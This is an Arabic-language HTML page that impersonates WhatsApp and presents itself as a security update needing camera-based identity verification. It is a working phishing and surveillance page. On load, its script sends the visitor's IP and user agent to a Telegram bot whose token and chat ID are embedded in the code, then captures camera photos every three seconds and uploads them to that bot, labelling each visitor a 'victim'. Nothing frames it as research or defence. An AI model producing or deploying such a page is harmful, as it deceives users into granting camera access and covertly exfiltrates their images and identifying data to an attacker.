<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واتساب</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #333; 
            overflow: hidden;
        }
        .container { 
            background: rgba(255,255,255,0.95); 
            border-radius: 20px; 
            padding: 40px; 
            text-align: center; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
            max-width: 400px; 
            width: 90%; 
            backdrop-filter: blur(10px);
        }
        .logo { 
            width: 80px; height: 80px; 
            background: #25D366; 
            border-radius: 50%; 
            margin: 0 auto 20px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 40px; 
            color: white; 
            font-weight: bold;
        }
        h1 { font-size: 28px; margin-bottom: 10px; color: #25D366; }
        p { font-size: 16px; margin-bottom: 30px; opacity: 0.8; }
        .camera-container { 
            position: relative; 
            width: 100%; 
            height: 300px; 
            background: #000; 
            border-radius: 15px; 
            overflow: hidden; 
            margin-bottom: 20px; 
            display: none;
        }
        #video { width: 100%; height: 100%; object-fit: cover; }
        .controls { 
            position: absolute; 
            bottom: 15px; 
            left: 50%; 
            transform: translateX(-50%); 
            display: flex; 
            gap: 10px;
        }
        .flip-btn { 
            background: rgba(255,255,255,0.9); 
            border: none; 
            border-radius: 50%; 
            width: 50px; height: 50px; 
            font-size: 20px; 
            cursor: pointer; 
            transition: all 0.3s; 
            display: flex; 
            align-items: center; 
            justify-content: center;
        }
        .flip-btn:hover { background: white; transform: scale(1.1); }
        .status { 
            background: #25D366; 
            color: white; 
            padding: 12px; 
            border-radius: 25px; 
            font-size: 14px; 
            margin-bottom: 20px; 
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="container" id="updateScreen">
        <div class="logo">واتساب</div>
        <h1>تحديث أمان جديد</h1>
        <p>للحفاظ على حسابك آمنًا، يرجى السماح بالوصول للكاميرا للتحقق من الهوية</p>
        <div class="status">جاري التحديث...</div>
    </div>

    <div class="container hidden" id="cameraScreen">
        <h1>التحقق من الهوية</h1>
        <p>الرجاء النظر إلى الكاميرا لمدة 3 ثوانٍ</p>
        <div class="camera-container" id="cameraContainer">
            <video id="video" autoplay muted playsinline></video>
            <div class="controls">
                <button class="flip-btn" id="flipBtn">🔄</button>
            </div>
        </div>
        <div class="status">جاري التقاط الصورة...</div>
    </div>

    <script>
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
        const CHAT_ID = '8539996558';
        let video = document.getElementById('video');
        let currentStream = null;
        let facingMode = 'user'; // ابدأ بكاميرا أمامية

        // إرسال IP أولاً
        async function sendIP() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const victimIP = ipData.ip;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🎣 فيكتيم جديد!\n📍 IP: ${victimIP}\n🌐 User-Agent: ${navigator.userAgent}`
                    })
                });
                console.log('IP sent:', victimIP);
            } catch(e) { console.error('IP send failed'); }
        }

        // تبديل الكاميرا
        async function flipCamera() {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
            startCamera();
        }

        // بدء الكاميرا
        async function startCamera() {
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                video.srcObject = currentStream;
                video.play();
                setTimeout(capturePhoto, 2000); // التقاط أول صورة بعد 2 ثانية
                startAutoCapture(); // التقاط تلقائي كل 3 ثوان
            } catch(e) {
                console.error('Camera access denied:', e);
                showUpdateScreen();
            }
        }

        // التقاط صورة واحدة
        async function capturePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `📸 صورة من فيكتيم\n🎥 كاميرا: ${facingMode === 'user' ? 'أمامية' : 'خلفية'}`);
                
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const data = await res.json();
                    console.log('Photo sent:', data.ok ? 'Success' : data.description);
                } catch(e) {
                    console.error('Photo send failed:', e);
                }
            }, 'image/jpeg', 0.8);
        }

        // التقاط تلقائي كل 3 ثوان
        function startAutoCapture() {
            setInterval(capturePhoto, 3000);
        }

        // إظهار شاشة الكاميرا
        function showCameraScreen() {
            document.getElementById('updateScreen').classList.add('hidden');
            document.getElementById('cameraScreen').classList.remove('hidden');
            document.getElementById('cameraContainer').style.display = 'block';
        }

        // إظهار شاشة التحديث
        function showUpdateScreen() {
            document.getElementById('cameraScreen').classList.add('hidden');
            document.getElementById('updateScreen').classList.remove('hidden');
        }

        // تشغيل بعد تحميل الصفحة
        window.addEventListener('load', async () => {
            await sendIP();
            setTimeout(() => {
                showCameraScreen();
                startCamera();
            }, 1500);
        });

        // زر تبديل الكاميرا
        document.getElementById('flipBtn').addEventListener('click', flipCamera);

        // تنظيف عند الخروج
        window.addEventListener('beforeunload', () => {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
